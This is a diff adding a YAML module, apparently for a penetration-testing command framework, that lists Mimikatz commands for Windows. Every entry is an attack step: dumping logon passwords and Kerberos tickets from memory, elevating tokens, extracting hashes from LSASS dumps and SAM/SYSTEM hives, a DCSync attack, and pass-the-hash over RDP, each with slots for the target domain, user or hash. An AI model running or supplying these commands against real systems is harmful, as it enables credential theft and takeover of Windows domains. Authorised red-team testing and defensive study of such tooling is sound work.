@@ -1,0 +1,89 @@
+---
+name: mimikatz
+description: Extracts credentials from memory and performs pass-the-hash, pass-the-ticket, and golden ticket attacks
+os: Windows
+ptf_module: null
+---
+commands:
+  - "Start Mimikatz":
+    - type: ["cmd","interactive"]
+    - text: "mimikatz.exe"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"mimikatz"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Log Mikikatz Output":
+    - type: ["mimikatz","interactive"]
+    - text: "log"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"mimikatz"},{"FILE":{"string":"Mimikatz.log"}}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Enable Debug Privileges for Processes":
+    - type: ["mimikatz","interactive"]
+    - text: "privilege::debug"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"mimikatz"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Dump Logon Passwords from Memory":
+    - type: ["mimikatz","interactive"]
+    - text: "sekurlsa::logonpasswords full"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"mimikatz"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Dump Any Stored Kerberos Tickets":
+    - type: ["mimikatz","interactive"]
+    - text: "sekurlsa::tickets /export"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"mimikatz"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Elevate Mimikatz Process Privileges":
+    - type: ["mimikatz","interactive"]
+    - text:
+      - "token::whoami"
+      - "token::elevate"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"mimikatz"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Extract Passwords from LSASS Process Dump File":
+    - type: ["mimikatz","interactive"]
+    - text:
+      - "sekurlsa::minidump {FILE}"
+      - "sekurlsa::logonpasswords"
+    - input: ["LSASS process dump file"]
+    - output: ["STDOUT",{"PROMPT":"mimikatz"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Extract Passwords from Registry SYSTEM and SAM Hive Files":
+    - type: ["mimikatz","interactive"]
+    - text: "lsadump::sam {FILE} {FILE}"
+    - input: ["SYSTEM backup file","SAM backup file"]
+    - output: ["STDOUT",{"PROMPT":"mimikatz"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "DCSYNC Attack":
+    - type: ["mimikatz","interactive"]
+    - text: "lsadump::dcsync /domain:{STR} /user:{STR}"
+    - input: ["domain","username"]
+    - output: ["STDOUT",{"PROMPT":"mimikatz"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Windows Pass-The-Hash (via RDP)":
+    - type: ["mimikatz","interactive"]
+    - text: "sekurlsa::pth /user:{STR} /domain:{STR} /ntlm:{STR} /run:\"mstsc.exe /restrictedadmin\""
+    - input: ["target user","domain","NTLM hash"]
+    - output: ["STDOUT",{"PROMPT":"mimikatz"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Exit Mimikatz":
+    - type: ["mimikatz","interactive"]
+    - text: "exit"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"cmd"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+...
